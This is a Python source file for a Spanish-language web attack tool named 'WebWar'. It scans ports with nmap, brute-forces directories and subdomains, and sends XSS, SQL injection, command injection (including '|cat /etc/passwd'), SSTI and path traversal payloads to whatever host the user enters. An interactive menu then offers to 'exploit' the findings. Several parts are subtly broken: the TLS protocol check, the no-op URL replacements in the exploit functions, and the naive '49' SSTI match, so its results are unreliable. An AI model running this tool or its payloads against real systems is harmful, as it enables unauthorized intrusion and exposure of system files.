#!/usr/bin/env python3
import os
import re
import sys
import socket
import requests
import nmap
import dns.resolver
import shutil
import ssl
import smtplib
import json
import subprocess
import threading
import time
import queue
from urllib.parse import urlparse
from datetime import datetime
from urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
import platform

# Desactivar advertencias de certificados inválidos
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuración global
# Por defecto, en Linux se usa '/usr/share/seclists'
WORDLIST_DIR = '/usr/share/seclists'
TIMEOUT = 25
THREADS = 50

def ensure_wordlists():
    """
    Verifica si existe el directorio de wordlists; si no, crea un directorio local
    y descarga dos archivos esenciales desde GitHub.
    """
    global WORDLIST_DIR
    if not os.path.exists(WORDLIST_DIR):
        print(f"[+] Directorio de wordlists no encontrado en {WORDLIST_DIR}.")
        # Se creará un directorio 'seclists' en el directorio actual
        local_dir = os.path.join(os.getcwd(), "seclists")
        os.makedirs(local_dir, exist_ok=True)
        urls = {
            "common.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
            "subdomains-top1million-110000.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt"
        }
        for filename, url in urls.items():
            file_path = os.path.join(local_dir, filename)
            print(f"[+] Descargando {filename} desde {url} ...")
            try:
                r = requests.get(url, timeout=30)
                if r.status_code == 200:
                    with open(file_path, 'wb') as f:
                        f.write(r.content)
                    print(f"[+] {filename} descargado en: {file_path}")
                else:
                    print(f"[!] Error al descargar {filename} (HTTP {r.status_code})")
            except Exception as e:
                print(f"[!] Excepción al descargar {filename}: {str(e)}")
        WORDLIST_DIR = local_dir
        print(f"[+] Directorio de wordlists configurado en: {WORDLIST_DIR}")
    else:
        print(f"[+] Directorio de wordlists encontrado: {WORDLIST_DIR}")

class WebWar:
    def __init__(self, target, output, aggressive=False, threads=THREADS):
        self.target = target
        self.output = output
        self.aggressive = aggressive
        self.threads = threads
        self.ip = ""
        self.vulnerabilidades = []
        self.cloudflare_detected = False
        self.open_ports = []
        self.report = None
        self.lock = threading.Lock()
        self.queue = queue.Queue()
        
        # Payloads para pruebas de vulnerabilidades
        self.xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E'
        ]
        self.sql_payloads = [
            "' OR 1=1-- -",
            "' UNION SELECT NULL,@@version-- -",
            "' AND 1=CONVERT(int, (SELECT @@version))-- -"
        ]
        self.ci_payloads = [
            ';id',
            '|cat /etc/passwd',
            'whoami',
            '$(ls -la)'
        ]
        self.ssti_payloads = [
            '{{7*7}}',
            '${{7*7}}'
        ]
        self.lfi_payloads = [
            '../../../../etc/passwd',
            '../../../../windows/win.ini'
        ]

    def print_banner(self):
        banner = f"""
        ██╗    ██╗███████╗██████╗     ██╗    ██╗ █████╗ ██████╗ 
        ██║    ██║██╔════╝██╔══██╗    ██║    ██║██╔══██╗██╔══██╗
        ██║ █╗ ██║█████╗  ██████╔╝    ██║ █╗ ██║███████║██████╔╝
        ██║███╗██║██╔══╝  ██╔══██╗    ██║███╗██║██╔══██║██╔══██╗
        ╚███╔███╔╝███████╗██████╔╝    ╚███╔███╔╝██║  ██║██║  ██║
         ╚══╝╚══╝ ╚══════╝╚═════╝      ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                         Auditoría Web Avanzada
                         by flox & p4rzival
                         Objetivo: {self.target}
        """
        with self.lock:
            self.report.write(banner + "\n")
            print(banner)

    def run_audit(self):
        try:
            with open(self.output, 'w') as self.report:
                self.print_banner()
                self.report.write(f"Inicio del escaneo: {datetime.now()}\n\n")
                
                self.resolve_dns()
                self.port_scan()
                self.ssl_analysis()
                self.web_scan()
                self.bruteforce_attacks()
                self.subdomain_enum()
                self.vuln_checks()
                self.exploit_vulns()
                
                self.generate_report()
        except Exception as e:
            print(f"Error crítico: {str(e)}")
            sys.exit(1)

    def resolve_dns(self):
        try:
            self.ip = socket.gethostbyname(self.target)
            self.report.write(f"[+] IP resuelta: {self.ip}\n")
        except socket.gaierror:
            self.ip = self.target
            self.report.write("[!] Usando el target como IP directa\n")

    def port_scan(self):
        self.report.write("\n[+] Iniciando escaneo avanzado de puertos...\n")
        try:
            nm = nmap.PortScanner()
            args = '-sV -T4 -p- --script vulners,banner'
            if self.aggressive:
                args += ' -A -sC'
                
            nm.scan(self.ip, arguments=args)
            
            for proto in nm[self.ip].all_protocols():
                ports = nm[self.ip][proto].keys()
                self.open_ports = sorted(ports)
                self.report.write(f"Puertos abiertos: {', '.join(map(str, self.open_ports))}\n")
                
                for port in ports:
                    service = nm[self.ip][proto][port]
                    self.report.write(f"\nPuerto {port}/tcp - {service['name']} {service['product']} {service['version']}\n")
                    if 'script' in service:
                        for script, output in service['script'].items():
                            if 'vulners' in script:
                                self.parse_vulners(output)
        except Exception as e:
            self.report.write(f"Error en el escaneo de puertos: {str(e)}\n")

    def parse_vulners(self, output):
        vulns = re.findall(r'CVE-\d+-\d+\s+(\d+\.\d+)', output)
        if vulns:
            self.vulnerabilidades.extend(vulns)
            self.report.write("[!] Posibles CVEs encontrados:\n")
            for v in vulns:
                self.report.write(f"  - {v}\n")

    def ssl_analysis(self):
        self.report.write("\n[+] Análisis SSL/TLS:\n")
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((self.ip, 443)) as sock:
                with ctx.wrap_socket(sock, server_hostname=self.target) as ssock:
                    cert = ssock.getpeercert()
                    self.report.write(f"Sujeto: {cert.get('subject')}\n")
                    self.report.write(f"Emisor: {cert.get('issuer')}\n")
                    self.report.write(f"Versión: {cert.get('version')}\n")
                    self.report.write(f"Expira: {cert.get('notAfter')}\n")
                    
                    # Verificar protocolos inseguros
                    for proto in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        try:
                            ctx_proto = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
                            ctx_proto.set_ciphers(proto)
                            with ctx_proto.wrap_socket(sock, server_hostname=self.target):
                                self.report.write(f"[!] Protocolo inseguro habilitado: {proto}\n")
                                self.vulnerabilidades.append(f"Protocolo SSL inseguro: {proto}")
                        except:
                            pass
        except Exception as e:
            self.report.write(f"Error en SSL: {str(e)}\n")

    def web_scan(self):
        self.report.write("\n[+] Análisis de la aplicación web:\n")
        self.dir_bruteforce()
        self.check_vulns()
        
        if self.aggressive:
            self.check_cves()
            self.file_bruteforce()

    def dir_bruteforce(self):
        self.report.write("\n[+] Fuerza bruta de directorios:\n")
        wordlist = os.path.join(WORDLIST_DIR, 'common.txt')
        if not os.path.exists(wordlist):
            self.report.write("[!] Wordlist (common.txt) no encontrada\n")
            return
            
        with open(wordlist) as f:
            directories = [line.strip() for line in f if line.strip()]
        
        self.queue_handler(
            items=directories,
            func=self.check_dir,
            message="Forzando directorios"
        )

    def check_dir(self, directory):
        for scheme in ['http', 'https']:
            url = f"{scheme}://{self.target}/{directory}"
            try:
                r = requests.get(url, verify=False, timeout=TIMEOUT)
                if r.status_code == 200:
                    with self.lock:
                        self.report.write(f"Encontrado: {url}\n")
            except:
                pass

    def check_vulns(self):
        self.report.write("\n[+] Verificación de vulnerabilidades:\n")
        test_urls = [
            f"http://{self.target}",
            f"https://{self.target}",
            f"http://{self.target}/index.php?id=1",
            f"https://{self.target}/search?q=test"
        ]
        
        for url in test_urls:
            self.test_xss(url)
            self.test_sqli(url)
            self.test_ci(url)
            self.test_ssti(url)
            self.test_lfi(url)

    def test_xss(self, url):
        parsed = urlparse(url)
        if parsed.query:
            for payload in self.xss_payloads:
                test_url = url.replace(parsed.query, f"{parsed.query}{payload}", 1)
                try:
                    r = requests.get(test_url, verify=False, timeout=TIMEOUT)
                    if payload in r.text:
                        self.vulnerabilidades.append(f"XSS: {test_url}")
                        self.report.write(f"[!] XSS encontrada: {test_url}\n")
                except:
                    pass

    def test_sqli(self, url):
        parsed = urlparse(url)
        if parsed.query:
            for payload in self.sql_payloads:
                test_url = url.replace(parsed.query, f"{parsed.query}{payload}", 1)
                try:
                    r = requests.get(test_url, verify=False, timeout=TIMEOUT)
                    if 'error in your sql syntax' in r.text.lower():
                        self.vulnerabilidades.append(f"SQLi: {test_url}")
                        self.report.write(f"[!] SQLi encontrada: {test_url}\n")
                except:
                    pass

    def test_ci(self, url):
        parsed = urlparse(url)
        if parsed.query:
            for payload in self.ci_payloads:
                test_url = url.replace(parsed.query, f"{parsed.query}{payload}", 1)
                try:
                    r = requests.get(test_url, verify=False, timeout=TIMEOUT)
                    if 'root:' in r.text or 'etc/passwd' in r.text:
                        self.vulnerabilidades.append(f"Inyección de comandos: {test_url}")
                        self.report.write(f"[!] Inyección de comandos encontrada: {test_url}\n")
                except:
                    pass

    def test_ssti(self, url):
        parsed = urlparse(url)
        if parsed.query:
            for payload in self.ssti_payloads:
                test_url = url.replace(parsed.query, f"{parsed.query}{payload}", 1)
                try:
                    r = requests.get(test_url, verify=False, timeout=TIMEOUT)
                    if "49" in r.text:
                        self.vulnerabilidades.append(f"SSTI: {test_url}")
                        self.report.write(f"[!] SSTI encontrada: {test_url}\n")
                except:
                    pass

    def test_lfi(self, url):
        parsed = urlparse(url)
        if parsed.query:
            for payload in self.lfi_payloads:
                test_url = url.replace(parsed.query, f"{parsed.query}{payload}", 1)
                try:
                    r = requests.get(test_url, verify=False, timeout=TIMEOUT)
                    if "root:" in r.text or "[extensions]" in r.text:
                        self.vulnerabilidades.append(f"LFI: {test_url}")
                        self.report.write(f"[!] LFI encontrada: {test_url}\n")
                except:
                    pass

    def subdomain_enum(self):
        self.report.write("\n[+] Enumeración de subdominios:\n")
        wordlist = os.path.join(WORDLIST_DIR, 'subdomains-top1million-110000.txt')
        if not os.path.exists(wordlist):
            self.report.write("[!] Wordlist de subdominios no encontrada\n")
            return
            
        with open(wordlist) as f:
            subdomains = [f"{line.strip()}.{self.target}" for line in f if line.strip()]
        
        self.queue_handler(
            items=subdomains,
            func=self.check_subdomain,
            message="Enumerando subdominios"
        )

    def check_subdomain(self, subdomain):
        try:
            resolver = dns.resolver.Resolver()
            resolver.timeout = 3
            resolver.lifetime = 5
            resolver.resolve(subdomain, 'A')
            with self.lock:
                self.report.write(f"Encontrado: {subdomain}\n")
        except:
            pass

    def queue_handler(self, items, func, message):
        print(f"[*] {message}...")
        for item in items:
            self.queue.put(item)
            
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, args=(func,))
            t.daemon = True
            t.start()
            threads.append(t)
            
        self.queue.join()
        for _ in range(self.threads):
            self.queue.put(None)
        for t in threads:
            t.join()

    def worker(self, func):
        while True:
            item = self.queue.get()
            if item is None:
                break
            func(item)
            self.queue.task_done()

    def generate_report(self):
        self.report.write("\n[+] Resumen del escaneo:\n")
        self.report.write(f"Objetivo: {self.target}\n")
        self.report.write(f"Dirección IP: {self.ip}\n")
        self.report.write(f"Puertos abiertos: {', '.join(map(str, self.open_ports))}\n")
        self.report.write("\nVulnerabilidades encontradas:\n")
        for vuln in set(self.vulnerabilidades):
            self.report.write(f" - {vuln}\n")
        self.report.write(f"\nEscaneo completado: {datetime.now()}\n")

    def exploit_vulns(self):
        if self.vulnerabilidades:
            print("\n[+] Vulnerabilidades encontradas. ¿Desea explotarlas? (s/n)")
            choice = input().strip().lower()
            if choice == 's':
                self.menu_exploit()

    def menu_exploit(self):
        print("\n[+] Seleccione una vulnerabilidad para explotar:")
        for idx, vuln in enumerate(self.vulnerabilidades, 1):
            print(f"{idx}. {vuln}")
        
        choice = input("\nIngrese el número de la vulnerabilidad a explotar (o 'n' para omitir): ").strip()
        if choice.lower() == 'n':
            return
        
        try:
            choice_idx = int(choice) - 1
            if 0 <= choice_idx < len(self.vulnerabilidades):
                vuln = self.vulnerabilidades[choice_idx]
                self.exploit(vuln)
            else:
                print("Elección inválida.")
        except ValueError:
            print("Entrada inválida.")

    def exploit(self, vuln):
        if 'XSS' in vuln:
            self.exploit_xss(vuln)
        elif 'SQLi' in vuln:
            self.exploit_sqli(vuln)
        elif 'Inyección de comandos' in vuln:
            self.exploit_ci(vuln)
        elif 'SSTI' in vuln:
            self.exploit_ssti(vuln)
        elif 'LFI' in vuln:
            self.exploit_lfi(vuln)
        else:
            print("No hay exploit disponible para esta vulnerabilidad.")

    def exploit_xss(self, vuln):
        url = vuln.split(": ")[1]
        print(f"\n[+] Explotando XSS en {url}")
        payload = '<script>alert(1)</script>'
        test_url = url.replace("alert(1)", "alert('Exploit')")
        print(f"Payload: {payload}")
        print(f"URL de explotación: {test_url}")
        print("Abra esta URL en su navegador para activar el exploit XSS.")

    def exploit_sqli(self, vuln):
        url = vuln.split(": ")[1]
        print(f"\n[+] Explotando SQLi en {url}")
        payload = "' OR 1=1-- -"
        test_url = url.replace("1=1", "1=1-- -")
        print(f"Payload: {payload}")
        print(f"URL de explotación: {test_url}")
        print("Acceda a esta URL para activar el exploit SQLi.")

    def exploit_ci(self, vuln):
        url = vuln.split(": ")[1]
        print(f"\n[+] Explotando Inyección de comandos en {url}")
        payload = ';id'
        test_url = url.replace("id", "id")
        print(f"Payload: {payload}")
        print(f"URL de explotación: {test_url}")
        print("Acceda a esta URL para activar el exploit de inyección de comandos.")

    def exploit_ssti(self, vuln):
        url = vuln.split(": ")[1]
        print(f"\n[+] Explotando SSTI en {url}")
        payload = '{{7*7}}'
        test_url = url.replace("7*7", "7*7")
        print(f"Payload: {payload}")
        print(f"URL de explotación: {test_url}")
        print("Abra esta URL en su navegador para intentar la explotación SSTI.")

    def exploit_lfi(self, vuln):
        url = vuln.split(": ")[1]
        print(f"\n[+] Explotando LFI en {url}")
        payload = '../../../../etc/passwd'
        test_url = url.replace("etc/passwd", "etc/passwd")
        print(f"Payload: {payload}")
        print(f"URL de explotación: {test_url}")
        print("Abra esta URL en su navegador para intentar la explotación LFI.")

    # Método placeholder para futuras funciones de fuerza bruta de archivos u otras
    def bruteforce_attacks(self):
        self.report.write("\n[+] Iniciando ataques de fuerza bruta (si aplica)...\n")
        # Se pueden agregar métodos adicionales aquí

    def check_cves(self):
        self.report.write("\n[+] Comprobación de CVEs (modo agresivo)...\n")
        # Se puede implementar la lógica para comprobar CVEs de forma más profunda

    def file_bruteforce(self):
        self.report.write("\n[+] Fuerza bruta de archivos (modo agresivo)...\n")
        # Se puede implementar la lógica de fuerza bruta de archivos adicionales

def main():
    print("Bienvenido a WebWar: Auditoría Web Avanzada")
    target = input("Introduce el target (dominio o IP): ").strip()
    output = input("Introduce el nombre del archivo de salida: ").strip()
    if not output:
        output = "webwar_report.txt"
    agg = input("¿Desea realizar un escaneo agresivo? (s/n): ").strip().lower()
    aggressive = (agg == 's')
    threads_input = input("Número de hilos (por defecto 50): ").strip()
    try:
        threads = int(threads_input) if threads_input else THREADS
    except:
        threads = THREADS

    # Detectar sistema operativo y configurar directorio de wordlists
    if os.name == 'nt':  # Windows
        default_wordlist = os.path.join(os.getcwd(), "seclists")
        WORDLIST_DIR = default_wordlist
    else:
        # En Linux se usa por defecto /usr/share/seclists
        WORDLIST_DIR = '/usr/share/seclists'
    
    # Verificar (y si es necesario, descargar) los wordlists
    ensure_wordlists()

    scanner = WebWar(
        target=target,
        output=output,
        aggressive=aggressive,
        threads=threads
    )
    
    scanner.run_audit()
    print(f"\n[+] Escaneo completado. Reporte guardado en: {output}")

if __name__ == "__main__":
    main()
